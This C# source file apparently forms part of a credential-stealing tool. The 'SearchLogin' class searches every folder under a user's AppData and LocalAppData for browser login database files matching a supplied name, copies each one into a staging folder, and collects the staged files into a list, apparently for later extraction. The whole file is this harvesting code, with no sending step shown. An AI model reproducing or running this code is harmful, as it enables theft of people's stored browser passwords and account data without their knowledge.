namespace DomaNet.Browsers
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Security;

    public class SearchLogin
    {
        private static List<string> _Box_Browser = new List<string>();

        public static void Search(string LoginData)
        {
            var Box_Files = new List<string>();

            var All_Browser_Path = new string[]
            {
               Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
               Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            };

            foreach (var DirPath in All_Browser_Path)
            {
                try
                {
                    Box_Files.AddRange(Directory.EnumerateDirectories(DirPath).Where(x => (new DirectoryInfo(x).Attributes & FileAttributes.Hidden) == 0).ToList());
                }
                catch (DirectoryNotFoundException) { break; }
                catch (SecurityException) { continue; }
                catch (IOException) { continue; }
            }

            foreach (var LoginFiles in Box_Files)
            {
                try
                {
                    _Box_Browser.AddRange(Directory.EnumerateFiles(LoginFiles, LoginData, SearchOption.AllDirectories));
                }
                catch (UnauthorizedAccessException) { continue; }
                catch (SecurityException) { continue; }
            }
        }

        #region Count Number

        private static int Fragment = 1;
        private static int GetScount => Fragment++;

        #endregion

        public static void EngineTemp(string Folder, bool Recursive = true)
        {
            try
            {
                Directory.CreateDirectory(Path.Combine(GetDirPath.User_Name, Folder));
            }
            catch (IOException) { }
            catch (UnauthorizedAccessException) { }
            catch (ArgumentException) { }

            for (var i = 0; i < _Box_Browser.Count; i++)
            {
                try
                {
                    if (File.Exists(_Box_Browser[i]))
                    {
                        File.Copy(_Box_Browser[i], Path.Combine(Path.Combine(GetDirPath.User_Name, Folder), Path.GetFileName(_Box_Browser[i] + GetScount)), true);
                    }
                }
                catch (IOException) { }
                catch (UnauthorizedAccessException) { }
                catch (ArgumentException) { }
            }
            _Box_Browser.Clear();
            GetSecureFile(Path.Combine(GetDirPath.User_Name, "Logins"), "*");
        }

        public static List<string> GetLogins = new List<string>();

        private static void GetSecureFile(string PathLogins, string Pattern, SearchOption SO = SearchOption.TopDirectoryOnly) 
        {
            try
            {
                foreach (var Mic in Directory.EnumerateFiles(PathLogins, Pattern, SO))
                {
                    if (File.Exists(Mic))
                    {
                        GetLogins.Add(Mic);
                    }
                }
            }
            catch (UnauthorizedAccessException) { }
            catch (IOException) { }
            catch (SecurityException) { }
        }
    }
}